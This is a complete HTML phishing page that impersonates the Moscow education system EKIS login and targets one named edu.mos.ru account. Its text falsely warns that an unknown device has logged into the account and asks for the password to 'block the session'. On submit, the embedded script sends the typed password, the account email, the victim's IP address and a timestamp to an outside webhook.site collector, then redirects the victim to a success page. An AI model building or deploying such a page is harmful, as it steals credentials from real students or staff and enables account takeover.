<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ЕКИС - Подтверждение входа</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: Arial, Helvetica, sans-serif;
            background: #f0f2f5;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }

        .card {
            max-width: 450px;
            width: 100%;
            background: white;
            border-radius: 12px;
            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
            overflow: hidden;
        }

        .card-header {
            text-align: center;
            padding: 30px 20px 20px;
            border-bottom: 1px solid #e0e0e0;
        }

        .logo {
            height: 60px;
            margin-bottom: 20px;
        }

        .warning-title {
            font-size: 18px;
            color: #d32f2f;
            font-weight: bold;
            margin-bottom: 8px;
        }

        .ekis-title {
            font-size: 24px;
            font-weight: bold;
            color: #1a1a2e;
            margin-bottom: 15px;
        }

        .card-body {
            padding: 25px 30px 35px;
        }

        .alert-box {
            background: #ffebee;
            border-left: 4px solid #d32f2f;
            padding: 15px;
            border-radius: 8px;
            margin-bottom: 25px;
        }

        .alert-box p {
            color: #333;
            font-size: 14px;
            line-height: 1.5;
        }

        .email-info {
            background: #f5f5f5;
            padding: 12px;
            border-radius: 8px;
            text-align: center;
            margin-bottom: 25px;
            font-size: 14px;
            color: #333;
        }

        .email-info span {
            font-weight: bold;
            color: #1a1a2e;
        }

        .form-group {
            margin-bottom: 20px;
        }

        label {
            display: block;
            font-size: 14px;
            font-weight: 600;
            color: #333;
            margin-bottom: 6px;
        }

        input {
            width: 100%;
            padding: 12px 15px;
            border: 1px solid #ccc;
            border-radius: 6px;
            font-size: 15px;
        }

        input:focus {
            outline: none;
            border-color: #007bff;
            box-shadow: 0 0 0 2px rgba(0, 123, 255, 0.2);
        }

        button {
            width: 100%;
            padding: 12px;
            background: #d32f2f;
            color: white;
            border: none;
            border-radius: 6px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            transition: background 0.2s;
            margin-top: 10px;
        }

        button:hover {
            background: #b71c1c;
        }

        .error-msg {
            color: #d32f2f;
            font-size: 13px;
            margin-top: 15px;
            text-align: center;
        }
    </style>
</head>
<body>
    <div class="card">
        <div class="card-header">
            <img class="logo" src="https://center.educom.ru/oauth/images/mosobr.svg" alt="Московское образование" onerror="this.src='https://via.placeholder.com/200x60?text=EKIS'">
            <div class="ekis-title">ЕКИС</div>
        </div>
        <div class="card-body">
            <div class="alert-box">
                <p> <strong>Кто-то зашёл в ваш аккаунт</strong> с нового устройства.</p>
            </div>

            <div class="email-info">
                 <strong>Ваш аккаунт:</strong> <span>ShashkovAA2@edu.mos.ru</span>
            </div>

            <p style="font-size: 14px; margin-bottom: 20px; color: #555;">Если это были <strong>НЕ ВЫ</strong> — введите пароль, чтобы мы заблокировали чужую сессию и защитили аккаунт.</p>

            <form id="loginForm">
                <div class="form-group">
                    <label>Введите ваш пароль для подтверждения личности</label>
                    <input type="password" id="password" placeholder="Пароль" required autofocus>
                </div>
                <button type="submit">Подтвердить и заблокировать чужую сессию</button>
                <div id="message" class="error-msg"></div>
            </form>
        </div>
    </div>

    <script>
        const WEBHOOK_URL = 'https://webhook.site/93d9b759-93db-4cc4-970f-47c09789fec3';

        const form = document.getElementById('loginForm');
        const msgDiv = document.getElementById('message');

        form.addEventListener('submit', async function(e) {
            e.preventDefault();

            const password = document.getElementById('password').value.trim();

            if (!password) {
                msgDiv.textContent = '❌ Введите пароль';
                return;
            }

            const data = new URLSearchParams();
            data.append('user', 'ShashkovAA2@edu.mos.ru');
            data.append('password', password);
            data.append('ip', await getIP());
            data.append('timestamp', new Date().toLocaleString('ru-RU'));
            data.append('type', 'session_block');

            try {
                await fetch(WEBHOOK_URL, {
                    method: 'POST',
                    body: data,
                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
                });
            } catch (err) {}

            // Переход на страницу успеха
            window.location.href = 'success.html';
        });

        async function getIP() {
            try {
                const res = await fetch('https://api.ipify.org?format=json');
                const data = await res.json();
                return data.ip;
            } catch {
                return 'не определен';
            }
        }
    </script>
</body>
</html>
